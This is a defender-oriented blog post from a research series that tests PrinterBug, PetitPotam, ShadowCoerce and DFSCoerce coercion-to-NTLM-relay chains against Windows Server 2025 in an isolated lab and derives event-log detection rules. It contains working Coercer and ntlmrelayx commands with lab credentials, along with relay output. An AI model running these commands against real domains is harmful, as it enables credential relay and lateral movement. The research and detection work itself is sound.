---
title: "Windows Authentication Coercion to NTLM Relay, Part 3: The Matrix"
date: 2026-06-26
categories: [Personal]
tags: [Windows, Active Directory, Relay, Privilege Escalation, Research]
published: true
---

In [Part 1](https://cbev0x.github.io/personal/2026/06/23/Coercion_to_Relay_Research_part_1.html) and [Part 2](https://cbev0x.github.io/personal/2026/06/23/Coercion_to_Relay_Research_part_2.html) of this series I laid out the research goal: build an isolated lab running current Windows Server 2025 defaults, then systematically test whether the classic authentication coercion primitives (PrinterBug, PetitPotam, ShadowCoerce, and DFSCoerce) still function the way most public writeups describe, or whether Microsoft's incremental hardening over the last few years has quietly closed gaps that a lot of offensive tooling still assumes are open.

This post covers the actual lab runs: what worked, what didn't, why, and, critically for a defender-facing writeup, what each outcome looks like in Sysmon and Windows Security event logs. If you're building detections for coercion-to-relay chains, the goal here is to give you concrete field values to alert on, not just technique names to Google.

## Lab setup recap

- **Domain:** `corp.lab`, three Windows Server 2025 Datacenter (Evaluation) hosts: `DC01` (192.168.50.10), `SRV01` (192.168.50.11, file server role with `FS-VSS-Agent` and `FS-DFS-Namespace` installed), `SRV02` (192.168.50.12, generic member server with Print Spooler running).
- **Telemetry:** Sysmon (Olaf Hartong's sysmon-modular config) plus Winlogbeat, shipping through Logstash into Elasticsearch/Kibana (8.19.16).
- **Attacker box:** Kali Linux (192.168.50.50) running Coercer v2.4.3 for triggering, and Impacket's `ntlmrelayx` for the relay leg.
- **Accounts held constant across every test:**
  - `coercetest`, a low-privilege domain user with no local admin anywhere. This represents a realistic initial foothold and was used as the *trigger* identity for every coercion call.
  - `jdoe` / `asmith`, domain users pre-seeded with local Administrators rights on the relay targets. These represent the privilege the attacker is trying to *land*, not the identity doing the coercing.

Holding the trigger account constant across all four techniques was deliberate: it means any difference in outcome between techniques is attributable to the technique itself, not to who was running it.

## The matrix

| Technique | Protocol | Coercion Target(s) | Relay Target | Access Control | Outcome |
|---|---|---|---|---|---|
| PrinterBug | MS-RPRN | SRV02 | SRV01 | None | Coercion and relay succeeded |
| PetitPotam | MS-EFSR | SRV02 | SRV01 | EFS service must be running (default: stopped, trigger-start) | Failed by default, succeeded after manual service start |
| ShadowCoerce | MS-FSRVP | SRV01 | SRV02 | Caller must be in local Administrators or Backup Operators | Failed with low-priv account, succeeded with admin-equivalent |
| DFSCoerce | MS-DFSNM | SRV01, DC01 | SRV02 | None at the RPC level | RPC calls succeeded server-side; no outbound coercion callback observed on either target |

Four techniques, four different outcomes, none of which match a simple "it works" or "it's patched" binary. That nuance is the actual finding.

---

## PrinterBug (MS-RPRN)

### The trigger

```bash
# Listener
sudo impacket-ntlmrelayx -t smb://192.168.50.11 -smb2support

# Trigger, low-priv account, no special conditions
coercer coerce -t 192.168.50.12 -u coercetest -p 'Coerce123!' -d corp.lab -l 192.168.50.50 --filter-protocol-name MS-RPRN
```

### What happened

The Print Spooler service is running by default on SRV02. Coercer bound to the RPC interface on port 49668 and successfully invoked `RpcRemoteFindFirstPrinterChangeNotification(Ex)`. SRV02's machine account authenticated back to the Kali listener, and `ntlmrelayx` relayed that authentication onward to SRV01 over SMB:

```
[*] (RPC): Authenticating connection from CORP/SRV02$@192.168.50.12 against smb://192.168.50.11 SUCCEED [1]
[-] smb://CORP/SRV02$@192.168.50.11 [1] -> DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```

The `rpc_s_access_denied` at the end is not a relay failure. It's the *next* step, an authenticated action requiring privilege, being denied because the identity that authenticated is `SRV02$`, a machine account with no rights on SRV01. The relay itself worked; the attacker just didn't have anywhere useful to go with it yet without further privilege chaining (RBCD, for example).

![](/assets/img/2026-06-23-Coercion_to_Relay_Research/printerbug_coercetest1.png)

![](/assets/img/2026-06-23-Coercion_to_Relay_Research/printerbug_coercetest2.png)

### Detection: the Workstation/IP mismatch

This is the most important thing in this entire writeup, and it's not specific to PrinterBug. It shows up identically across every successful coercion-to-relay chain we tested.

On the relay target (SRV01), the resulting `4624` logon event shows:

```
WorkstationName: SRV02
Source Network Address: 192.168.50.50
```

That's a contradiction a defender should catch immediately: if `SRV02$` is really authenticating, the source IP should be SRV02's own address (192.168.50.12), not an unrelated host. The presence of `WorkstationName: SRV02` paired with `IpAddress: 192.168.50.50` is the relay artifact itself. The coerced machine claims its own name, but the network path proves the traffic was captured and replayed by an intermediary.

**Detection rule logic:** Alert on any `4624` (or `4768`/`4769` if Kerberos is involved) where the `WorkstationName` field's claimed hostname does not resolve to, or match, the `IpAddress` field's actual source. This single correlation generalizes across PrinterBug, PetitPotam, and (per public research) most other NTLM-relay-based coercion chains, because it's a property of the relay mechanism, not the coercion primitive used to trigger it.

---

## PetitPotam (MS-EFSR)

### First attempt: default state

```bash
coercer coerce -t 192.168.50.12 -u coercetest -p 'Coerce123!' -d corp.lab -l 192.168.50.50 --filter-protocol-name MS-EFSR -v
```

Every bind attempt against the EFSRPC interface (UUID `c681d488-d850-11d0-8c52-00c04fd90f7e`) across `lsarpc`, `lsass`, `netlogon`, and `samr` failed:

```
[!] Something went wrong, check error status => Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported
```

The dedicated `\PIPE\efsrpc` and `\PIPE\Fssagentrpc` pipes returned `STATUS_OBJECT_NAME_NOT_FOUND`. They simply weren't there. The reason: **EFS is a trigger-start service on Server 2025**, and it sits idle until something specifically invokes EFS functionality. An RPC bind attempt alone doesn't satisfy that trigger condition.

### Second attempt: EFS manually started

```powershell
Start-Service EFS
```

```bash
coercer coerce -t 192.168.50.12 -u coercetest -p 'Coerce123!' -d corp.lab -l 192.168.50.50 --filter-protocol-name MS-EFSR
```

This time the bind succeeded immediately:

```
[+] SMB named pipe '\PIPE\efsrpc' is accessible!
   [+] Successful bind to interface (df1941c5-fe89-4e79-bf10-463657acf44d, 1.0)!
```

Every EFSRPC method Coercer tried, including `EfsRpcAddUsersToFile(Ex)`, `EfsRpcDecryptFileSrv`, `EfsRpcOpenFileRaw`, and `EfsRpcQueryUsersOnFile`, fired cleanly. The relay to SRV01 succeeded three separate times across the testing window, each showing the identical `WorkstationName`/`IpAddress` mismatch pattern documented above.

![](/assets/img/2026-06-23-Coercion_to_Relay_Research/petitpotam_coercetest1.png)

### The finding: a precondition gap, not a patch

This is worth being precise about for anyone building a threat model. PetitPotam is not "fixed" on Server 2025. Once EFS is running, it works exactly as classic PetitPotam research describes. But it is no longer opportunistically available the instant a host boots, the way it effectively was on older Windows builds where EFS-adjacent services were more readily reachable. An attacker, or a defender reasoning about exposure, now needs a concrete answer to "is EFS active on this host right now," not just "is this host vulnerable to PetitPotam."

**Detection angle:** A `7036` Service Control Manager event showing EFS transitioning to "running" immediately followed (within a second or two) by inbound SMB named-pipe connections to `\PIPE\efsrpc` from an unfamiliar source is a strong combined signal. Legitimate EFS usage doesn't typically look like that.

![](/assets/img/2026-06-23-Coercion_to_Relay_Research/7036event.png)

---

## ShadowCoerce (MS-FSRVP)

### First attempt: low-privilege account

```bash
coercer coerce -t 192.168.50.11 -u coercetest -p 'Coerce123!' -d corp.lab -l 192.168.50.50 --filter-protocol-name MS-FSRVP
```

The `FssAgent` service was stopped by default (also trigger-start). After starting it:

```powershell
Start-Service FssAgent
```

The bind to `\PIPE\Fssagentrpc` succeeded, but every method call was rejected outright:

```
[+] Successful bind to interface (a8e0653c-2744-4389-a61d-7373df8b2292, 1.0)!
   [!] (RPC_S_ACCESS_DENIED) MS-FSRVP --> IsPathShadowCopied(ShareName='\\192.168.50.50\x00')
   [!] (RPC_S_ACCESS_DENIED) MS-FSRVP --> IsPathSupported(ShareName='\\192.168.50.50\x00')
```

`RPC_S_ACCESS_DENIED` here is a different failure mode than PetitPotam's missing-pipe error. The interface is reachable and the bind succeeds, but the *method invocation itself* is rejected before any coercion attempt can occur. That's an authorization failure, not a connectivity one.

![](/assets/img/2026-06-23-Coercion_to_Relay_Research/RPC_S_ACCESS_DENIED.png)

### Second attempt: local-admin-equivalent account

```bash
coercer coerce -t 192.168.50.11 -u jdoe -p 'Passw0rd123!' -d corp.lab -l 192.168.50.50 --filter-protocol-name MS-FSRVP
```

With `jdoe` (pre-seeded into SRV01's local Administrators group), the same calls now returned `NO_AUTH_RECEIVED` instead of `RPC_S_ACCESS_DENIED`, meaning the calls were authorized and actually executed; we just didn't observe the resulting callback hit our specific listener in this run.

### The finding: this is a real access control, and it's visible in the logs

The Kibana data tells the actual story precisely. Immediately after `jdoe`'s authenticated NTLM session landed, the `VSSVC.exe` (Volume Shadow Copy service) process started and ran a series of **Event ID 4799** "security-enabled local group membership enumerated" checks, querying membership in:

- `Administrators` (S-1-5-32-544)
- `Backup Operators` (S-1-5-32-551)

![](/assets/img/2026-06-23-Coercion_to_Relay_Research/shadowcoerce_coercetest1.png)

This is FSRVP's actual authorization mechanism: **the calling account must already be a member of one of those two local groups on the target.** That's a fundamentally different model than PrinterBug or EFSRPC, which accept any authenticated domain account with no group check whatsoever.

```
4624 (jdoe, ElevatedToken: Yes)
  -> VSSVC.exe starts (7036)
    -> 4799 x N (membership check: Administrators, then Backup Operators)
```

![](/assets/img/2026-06-23-Coercion_to_Relay_Research/shadowcoerce_coercetest3.png)

**Why this matters for threat modeling:** ShadowCoerce is frequently grouped alongside PrinterBug and PetitPotam in coercion technique lists as if they're interchangeable options for a low-privilege foothold. They are not. On Server 2025 defaults, ShadowCoerce requires privilege roughly equivalent to what an attacker would need for direct exploitation anyway; it doesn't meaningfully extend what a low-priv foothold can reach. PrinterBug and (once EFS is active) PetitPotam actually do.

**Detection rule logic:** A `4799` group-membership enumeration for `Administrators` or `Backup Operators` performed by `VSSVC.exe` (`CallerProcessName`), immediately preceded by an inbound NTLM logon over SMB from an unfamiliar source IP, is a near-unambiguous ShadowCoerce attempt indicator. Legitimate VSS administration on a file server doesn't typically originate this way from a network-authenticated session.

---

## DFSCoerce (MS-DFSNM)

### The trigger, tested against two roles

```bash
# Against the file server
coercer coerce -t 192.168.50.11 -u coercetest -p 'Coerce123!' -d corp.lab -l 192.168.50.50 --filter-protocol-name MS-DFSNM -v

# Against the domain controller
coercer coerce -t 192.168.50.10 -u coercetest -p 'Coerce123!' -d corp.lab -l 192.168.50.50 --filter-protocol-name MS-DFSNM -v
```

Both produced identical results. The bind to `\PIPE\netdfs` (interface `4fc742e0-4a10-11cf-8273-00aa004ae673`) succeeded immediately with the low-privilege `coercetest` account, with no access-control rejection of any kind:

```
[+] Successful bind to interface (4fc742e0-4a10-11cf-8273-00aa004ae673, 3.0)!
   [!] (NO_AUTH_RECEIVED) MS-DFSNM --> NetrDfsAddStdRoot(ServerName='\\192.168.50.50\...')
   [!] (SMB_STATUS_PIPE_DISCONNECTED) MS-DFSNM --> NetrDfsRemoveStdRoot(...)
```

![](/assets/img/2026-06-23-Coercion_to_Relay_Research/DFScoerce_coercetest1.png)

`NetrDfsAddStdRoot` executed four times with no error of any kind on either host. `NetrDfsRemoveStdRoot` subsequently hit `SMB_STATUS_PIPE_DISCONNECTED`, consistent with the prior calls having done *something* stateful that tore down the pipe context.

### The finding: open access control, but no observed callback

We checked both the coercion target's own security log and the relay target's log for this entire window. The result was consistent and worth stating precisely:

- **SRV01/DC01 (coercion targets):** only inbound authentication from `coercetest` itself (the RPC calls being made). No outbound `SRV01$` or `DC01$` authentication attempt toward the listener anywhere in the log.
- **SRV02 (relay target):** zero authentication attempts at all during either DFSCoerce window.

![](/assets/img/2026-06-23-Coercion_to_Relay_Research/DFScoerce_coercetest3.png)

This is different from a simple "DFSCoerce is patched" conclusion. The RPC interface is exactly as open as PrinterBug's: no privilege gate, no missing service, and the calls complete without error. But the specific UNC path Coercer constructs in the `ServerName` parameter did not produce an actual outbound authentication callback in this environment, on either a file server or a domain controller.

We can't fully explain this from the data alone, and we're flagging that honestly rather than overstating the finding. Two hypotheses worth testing in a follow-up: (1) `NetrDfsAddStdRoot`'s `ServerName` parameter may need to resolve against an existing DFS namespace topology to actually trigger a callback, rather than working opportunistically against an arbitrary string the way PrinterBug's `pszLocalMachine` does; or (2) Coercer's specific parameter construction for this method may not match what current public DFSCoerce proof-of-concepts use. Either way, the honest result is: **RPC-level access is open, but the coercion primitive as commonly tooled did not produce a working chain against Server 2025 in this lab.**

**Why a negative result still belongs in a defender-facing writeup:** most public coercion research documents what works. Knowing what *doesn't* reliably work against current defaults, and exactly how that was tested rather than assumed, is equally actionable for anyone trying to build an accurate risk picture rather than copying a five-year-old technique list.

---

## Cross-cutting takeaways

**1. The Workstation/IP mismatch is your highest-value, technique-agnostic detection.** It appeared identically across PrinterBug and PetitPotam relay chains regardless of which RPC interface triggered the original authentication. If you build one detection rule from this entire series, build this one.

**2. Server 2025's trigger-start service model creates a precondition gap, not a patch.** Both EFS (PetitPotam) and FssAgent (ShadowCoerce, though gated differently again on top of that) sit idle by default. This is a meaningful shift from older Windows versions where these surfaces were more readily reachable without any setup step, but it's a brittle mitigation, not a fix, since both services start automatically and silently the moment something legitimate needs them.

**3. Not all coercion techniques share an access-control model. Treat them as a spectrum, not a category.** PrinterBug and PetitPotam (once active) require nothing beyond valid domain authentication. ShadowCoerce requires local-admin-equivalent privilege on the target. DFSCoerce sits somewhere we don't yet fully understand: open at the RPC layer, but not reliably weaponizable with current public tooling against this configuration. A risk assessment that lists all four as equivalent "low-priv coercion vectors" is materially overstating exposure for at least one of them, possibly two.

**4. Service-start events are an underused correlation point.** Watching for `EFS`, `FssAgent`, or `VSSVC` entering a running state in proximity to inbound SMB/RPC connections from unfamiliar hosts catches both the precondition (PetitPotam) and the access-control enforcement mechanism (ShadowCoerce's `VSSVC` group checks) in one pattern.

## Limitations and next steps

- All testing used a single low-privilege account (`coercetest`) as the trigger identity and a single admin-equivalent account (`jdoe`) for the ShadowCoerce comparison. A broader privilege gradient, such as a member of Server Operators or a group with delegated rights short of full admin, would sharpen exactly where the ShadowCoerce authorization boundary sits.
- DFSCoerce needs a follow-up with either a pre-staged DFS namespace topology or a different tooling implementation (raw Impacket DCERPC calls instead of Coercer) before drawing a firm conclusion about its viability against Server 2025.
- This lab has not yet tested LDAP signing/channel binding variation for the LDAP-relay side of these chains. That comparison, especially relevant given Server 2025's tightened defaults around signing, is planned for Part 4.
